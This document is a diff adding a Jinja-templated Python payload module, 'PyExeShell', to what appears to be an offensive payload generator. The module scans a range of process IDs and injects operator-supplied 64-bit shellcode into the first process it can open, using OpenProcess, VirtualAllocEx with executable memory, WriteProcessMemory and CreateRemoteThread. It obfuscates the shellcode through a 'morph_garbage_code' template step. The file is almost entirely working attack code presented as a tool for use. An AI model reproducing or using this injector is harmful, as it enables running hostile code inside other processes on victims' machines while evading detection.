@@ -1,0 +1,84 @@
+#!name##PyExeShell
+#!types##payload
+#!info##A simple python script [W]. It checks each process PID in given range and tries to inject shellcode into it.
+#!reqVar##PES_scode##64 bit shellcode to execute. You can paste your own or use ready-made ones from the FOOD section.##str##LOAD_SHELLCODE:True
+#!reqVar##PES_start_pid##The PID number from which the process search begins.##int
+#!reqVar##PES_max_pid##Last PID number of the process.##int
+#!setVar##PES_start_pid##2100##int
+#!setVar##PES_max_pid##11000##int
+#!reqVar##PES_memory##Amount of memory in bytes to reserve in the process for shellcode. If you have a large shellcode, increase this value.##int
+#!setVar##PES_memory##512##int
+#!reqVar##PES_wait##Whether to use the 'WaitForSingleObject' function after starting the thread.##bool
+#!setVar##PES_wait##False##bool
+#!reqVar##PES_twait##Number of milliseconds for WaitForSingleObject function. Passing a value of '-1' means INFINITY##int
+#!setVar##PES_twait##10##int
+#!import_FLAG##True
+#!render_FLAG##True
+
+import ctypes
+from ctypes import wintypes, byref
+K32 = ctypes.windll.kernel32
+
+PAGE_EXECUTE_READWRITE = 0x00000040
+PROCESS_ALL_ACCESS = ( 0x000F0000 | 0x00100000 | 0xFFF )
+VIRTUAL_MEM  = ( 0x1000 | 0x2000 )
+SIZE_T = ctypes.c_size_t
+LP_SIZE_T = ctypes.POINTER(SIZE_T)
+DWORD = wintypes.DWORD
+BOOL = wintypes.BOOL
+HANDLE = wintypes.HANDLE
+LPVOID = wintypes.LPVOID
+LPCVOID = wintypes.LPCVOID
+INT = wintypes.INT
+
+
+def shellcode():
+    raw = "{{TOOL.morph_garbage_code(PES_scode)}}"
+    sc = []
+    for i in range(0, len(raw), 3):
+        b = raw[i+1:i+3]
+        sc.append(int(b, 16))
+    return bytes(sc)
+
+SHELLCODE = shellcode()
+
+
+def close(handle):
+    K32.CloseHandle(handle)
+
+
+def inject(pid):
+    op = K32.OpenProcess
+    op.argtypes = [DWORD, BOOL, DWORD]
+    op.restype = HANDLE
+    vae = K32.VirtualAllocEx
+    vae.argtypes = [HANDLE, LPVOID, SIZE_T, DWORD, DWORD]
+    vae.restype = LPVOID
+    wpm = K32.WriteProcessMemory
+    wpm.argtypes = [HANDLE, LPVOID, LPCVOID, SIZE_T, LP_SIZE_T]
+    wpm.restype = INT
+    th = K32.CreateRemoteThread
+    th.argtypes = [HANDLE, LPVOID, SIZE_T, LPVOID, LPVOID, DWORD, DWORD]
+    th.restype = INT
+
+    hproc = op(PROCESS_ALL_ACCESS, False, pid)
+    if hproc:
+        mem_addr = vae(hproc, 0, {{PES_memory}}, VIRTUAL_MEM, PAGE_EXECUTE_READWRITE)
+        if mem_addr:
+            scode = ctypes.create_string_buffer(SHELLCODE, len(SHELLCODE))
+            bytes_wr = SIZE_T(0)
+            out = wpm(hproc, mem_addr, scode, len(scode), byref(bytes_wr))
+            if out != 0:
+                out = th(hproc, 0, 0, mem_addr, 0, 0, 0)
+                if out != 0:
+                    {% if PES_wait %}
+                    K32.WaitForSingleObject(hproc, {{PES_twait}})
+                    {%endif%}
+                    close(hproc)
+                    return True
+        close(hproc)
+    return False
+
+for pid in range({{PES_start_pid}}, {{PES_max_pid + 1}}):
+    if inject(pid):
+        break
